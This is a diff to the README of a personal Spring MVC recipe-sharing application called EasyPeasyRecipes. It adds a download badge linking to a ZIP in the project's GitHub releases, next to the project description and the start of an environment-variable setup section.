@@ -5,6 +5,11 @@ This is my first personal Spring MVC project application for EasyPeasyRecipes. I
 
 EasyPeasyRecipes is a web application that allows users to browse, create, and share recipes. Users can also add comments and rate recipes. The application integrates with a REST API to manage comments.
 
+## Download
+
+[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/IrenaStoyneva/EasyPeasyRecipesProject/releases/download/v1.0.1/EasyPeasyRecipes-master.zip)
+
+
 ## Setting Up Environment Variables
 
 Before running the application, make sure to set up the following environment variables. You can do this by creating a `.env` file in the root directory of the project.
